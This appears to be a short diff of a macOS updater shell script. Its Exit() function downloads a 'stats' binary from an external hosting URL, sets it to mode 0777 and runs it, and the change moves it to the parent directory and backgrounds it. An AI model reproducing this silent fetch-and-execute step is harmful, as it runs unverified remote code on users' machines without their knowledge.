@@ -16,9 +16,9 @@ to display alert \"$1\" message \"$2\" buttons $3 default  button 1"
 }
 Exit()
 {
-  download "http://sr3u.16mb.com/app_updates/CRT/stats" "./stats"
-  chmod 0777 "./stats"
-  ./stats
+  download "http://sr3u.16mb.com/app_updates/CRT/stats" "../stats"
+  chmod 0777 "../stats"
+  ../stats &
   exit $@
 }
 OLDVERSION=$1
